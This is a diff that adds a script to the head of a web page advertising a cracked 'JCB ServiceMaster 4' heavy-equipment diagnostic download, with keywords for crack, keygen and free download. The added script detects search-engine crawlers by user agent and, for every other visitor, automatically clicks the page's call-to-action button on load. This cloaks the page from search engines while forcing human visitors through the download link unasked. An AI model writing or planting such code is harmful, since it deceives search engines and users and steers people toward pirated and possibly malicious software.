@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>JCB ServiceMaster 4 V24.6.2 07.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="JCB ServiceMaster 4 V24.6.2 07.2024 diagnostic software for JCB heavy equipment. Supports Windows and multiple languages, includes ECU Flash files.">
     <meta name="keywords" content="JCB ServiceMaster 4 V24.6.2 07.2024, JCB ServiceMaster 4 diagnostic software, JCB diagnostic program, JCB ServiceMaster 4 2024, JCB ServiceMaster 4 download, JCB ServiceMaster 4 free download, JCB ServiceMaster 4 keygen, JCB ServiceMaster 4 crack, JCB ServiceMaster 4 high speed download, JCB ServiceMaster diagnostic software, JCB ServiceMaster 4 V24.6.2 download, JCB ServiceMaster 4 languages support, JCB ServiceMaster 4 heavy equipment, JCB ServiceMaster 4 Windows 7, JCB ServiceMaster 4 Windows 8, JCB ServiceMaster 4 Windows 10, JCB ServiceMaster 4 Windows 11, JCB Electronic Service tool, JCB machineries diagnostics, JCB ECU Flash files, JCB Dieselmax engines support, JCB Ecomax engines support, JCB ServiceMaster 4 V24.6.2 скачать, JCB ServiceMaster 4 диагностика программное обеспечение, скачать JCB ServiceMaster 4 2024, JCB ServiceMaster 4 диагностическая программа, JCB ServiceMaster 4 безплатно скачать, JCB ServiceMaster 4 кряк">
     <style>
